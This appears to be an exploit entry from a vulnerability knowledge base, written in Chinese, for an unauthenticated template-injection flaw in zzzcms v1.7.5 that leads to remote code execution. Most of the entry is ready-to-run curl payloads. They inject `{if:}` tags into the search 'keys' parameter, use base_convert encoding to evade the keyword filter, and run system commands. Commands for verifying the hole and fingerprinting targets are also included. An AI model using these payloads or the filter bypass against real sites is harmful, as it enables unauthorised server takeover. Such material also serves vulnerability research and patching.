---
id: ZZZCMS-SSTI-RCE
title: zzzcms v1.7.5 前台模板注入远程命令执行漏洞
product: zzzcms
vendor: zzzcms
version_affected: "v1.7.5"
severity: CRITICAL
tags: [rce, ssti, 无需认证, 国产]
fingerprint: ["zzzcms", "ZZZcms"]
---

## 漏洞描述

zzzcms v1.7.5 的搜索功能 `parserSearch` 存在模板注入漏洞。`keys` 参数的值被直接传入模板引擎渲染，攻击者可通过 `{if:}` 标签注入 PHP 代码。虽然存在关键字拦截，可通过 `base_convert` 编码绕过。

## 影响版本

- zzzcms v1.7.5

## 前置条件

- 无需认证

## 利用步骤

1. 向搜索页面 `/?location=search` 发送 POST 请求
2. 在 `keys` 参数中注入 `{if:}` 模板标签
3. 使用 `base_convert` 绕过关键字过滤

## Payload

### 执行 phpinfo（直接）

```bash
curl -s "http://target/?location=search" \
  -d "keys={if:=phpinfo()}{end if}"
```

### 绕过拦截执行 phpinfo

```bash
# base_convert("phpinfo()", 32, 10) = 27440799224
curl -s "http://target/?location=search" \
  -d "keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}"
```

### 执行系统命令

```bash
# base_convert("system", 36, 10) = 1751504350
curl -s "http://target/?location=search" \
  -d "keys={if:=base_convert(1751504350,10,36)('id')}{end if}"
```

## 验证方法

```bash
curl -s "http://target/?location=search" \
  -d "keys={if:=phpinfo()}{end if}" | grep "phpinfo"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "zzzcms"
```

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2021-32605
